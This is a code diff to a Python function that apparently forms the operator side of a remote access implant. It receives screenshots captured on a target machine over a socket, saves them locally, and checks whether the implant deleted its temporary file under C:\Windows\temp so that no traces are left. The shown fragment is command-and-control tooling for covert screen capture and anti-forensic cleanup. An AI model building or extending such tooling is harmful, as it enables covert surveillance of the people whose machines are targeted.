@@ -27,22 +27,34 @@ def screenshot(sock, filePath):
         data = data.strip()
         data = data.decode('utf-8')
 
+        # We succeeded so get the file
         if (data == "SUCCESS"):
 
             # Get our screenshot file 
             print("Successful screenshot! Getting file contents...")
+            data = sock.recv(15000)# need to change to actual file size? screenshots are large...
+
+            with open(filePath, "wb") as outputfile:
+                    outputfile.write(data)
+                    outputfile.close()
+
+            print("Successfully wrote file to disk... awaiting implant reponse code...")
+
+            # Socket is getting extra file data and performing the check here...
             data = sock.recv(1024)
             data = data.strip()
             data = data.decode('utf-8')
 
-            with open(filePath, "w") as outputfile:
-                    outputfile.write(data)
-                    outputfile.close()
+            if (data == 'SUCCESS'):
+                print("Successful screenshot!\n")
 
-            print("Successful screenshot!\n")
+            else:
+                 print("Implant failed to delete file off target! Check C:\\Windows\\temp and ensure to delete that...")
+                 return FAILURE
 
         else:
             print("Implant returned FAILURE!\n")
+            return FAILURE
 
 
     except Exception as e:
